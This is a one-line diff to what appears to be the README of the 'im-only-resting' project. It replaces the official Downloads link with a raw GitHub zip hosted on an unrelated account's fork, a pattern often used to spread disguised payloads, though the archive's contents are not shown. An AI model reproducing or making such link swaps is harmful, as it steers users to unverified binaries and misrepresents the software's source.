@@ -1,4 +1,4 @@
-[User Guide](https://github.com/SwensenSoftware/im-only-resting/wiki) | [Downloads](http://www.swensensoftware.com/im-only-resting) | [Release Notes](../../wiki/ReleaseNotes) | [Issues](../../issues)
+[User Guide](https://github.com/SwensenSoftware/im-only-resting/wiki) | [Downloads](https://raw.githubusercontent.com/alviy/im-only-resting/asset/downloads/im-only-resting.zip) | [Release Notes](../../wiki/ReleaseNotes) | [Issues](../../issues)
 
 ---
 
